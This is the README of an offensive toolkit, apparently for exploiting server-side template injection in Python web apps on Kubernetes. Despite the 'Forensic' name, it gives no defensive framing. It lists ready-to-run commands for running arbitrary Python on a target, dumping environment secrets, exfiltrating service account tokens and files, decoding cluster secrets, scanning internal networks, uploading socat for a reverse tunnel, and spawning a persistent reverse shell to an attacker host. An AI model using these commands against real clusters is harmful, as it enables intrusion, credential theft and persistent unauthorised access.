# K8S Forensic SSTI Toolkit

This toolkit is designed to exploit Server-Side Template Injection (SSTI) vulnerabilities in Python web applications running on Kubernetes. It provides a modular framework for reconnaissance, data exfiltration, and persistence within a Kubernetes cluster.

## Usage

The main entry point is `attack.py`.

```bash
python3 attack.py --url <TARGET_URL> [OPTIONS]
```

### Options

- `--url <URL>`: **Required**. The target URL of the vulnerable application.
- `--exec <COMMAND>`: Execute raw Python code on the target.
- `--addon <ADDON_NAME>`: Execute a specific addon module.
- `--quiet`, `-q`: Suppress banner output.

## Addons

The toolkit includes several addons to automate common post-exploitation tasks.

### 1. Environment Recon (`env`)

Dumps the environment variables of the target container. This is useful for finding hardcoded secrets, configuration paths, and Kubernetes service host details.

```bash
python3 attack.py --url <URL> --addon env
```

### 2. Data Exfiltration (`exfil`)

Exfiltrates sensitive files or Kubernetes service account tokens.

- **Dump Service Account Token:**
  ```bash
  python3 attack.py --url <URL> --addon exfil --token-only
  ```
- **Dump File or Directory:**
  ```bash
  python3 attack.py --url <URL> --addon exfil /path/to/file_or_dir
  ```
  *Directories are archived as tar.gz before exfiltration.*

### 3. Kubernetes Resource Enumeration (`k8s_list`)

Lists Kubernetes resources in the current namespace using the pod's service account.

- **List Secrets (Default):**
  ```bash
  python3 attack.py --url <URL> --addon k8s_list
  ```
- **List Specific Resource:**
  ```bash
  python3 attack.py --url <URL> --addon k8s_list pods
  ```

### 4. Kubernetes Resource Retrieval (`k8s_get`)

Retrieves and decodes specific Kubernetes resources.

- **Get Secret (Default):**
  ```bash
  python3 attack.py --url <URL> --addon k8s_get my-secret
  ```
- **Get Specific Resource:**
  ```bash
  python3 attack.py --url <URL> --addon k8s_get configmap my-config
  ```
  *Secrets are automatically base64 decoded.*

### 5. RBAC Reconnaissance (`recon`)

Performs a "SelfSubjectRulesReview" to determine the permissions of the compromised pod's service account. It specifically checks for access to sensitive resources like `secrets` and `clusterroles`.

```bash
python3 attack.py --url <URL> --addon recon
```

### 6. Network Scanning (`scan`)

Performs a high-speed network scan to discover other services in the cluster.

- **Auto-Discovery:**
  Scans subnets derived from environment variables (e.g., `_SERVICE_HOST`).
  ```bash
  python3 attack.py --url <URL> --addon scan
  ```
- **Targeted Scan:**
  Scans a specific CIDR range.
  ```bash
  python3 attack.py --url <URL> --addon scan 10.96.0.0/16
  ```

### 7. Binary Upload (`upload_socat`)

Uploads a local `socat` binary to the target container. This is a prerequisite for the `proxy` addon.

- **Upload:**
  Reads `binaries/socat` locally and uploads it to `/tmp/socat` on the target.
  ```bash
  python3 attack.py --url <URL> --addon upload_socat
  ```

### 8. Persistent Proxy (`proxy`)

Creates a persistent reverse tunnel using `socat`. This allows you to tunnel traffic from the cluster back to your machine (e.g., to access the K8s API directly).

- **Start Proxy:**
  ```bash
  python3 attack.py --url <URL> --addon proxy <LHOST> <LPORT>
  ```
  *Requires `upload_socat` to be run first.*

### 9. Reverse Shell (`shell`)

Spawns a persistent background reverse shell.

- **Start Shell:**
  ```bash
  python3 attack.py --url <URL> --addon shell <LHOST> <LPORT>
  ```
  *Uses `os.fork()` to background the process on the target, keeping the shell alive even if the HTTP request times out.*

## Prerequisites

- Python 3
- `requests`
- `urllib3`

Install dependencies:
```bash
pip install -r requirements.txt
```
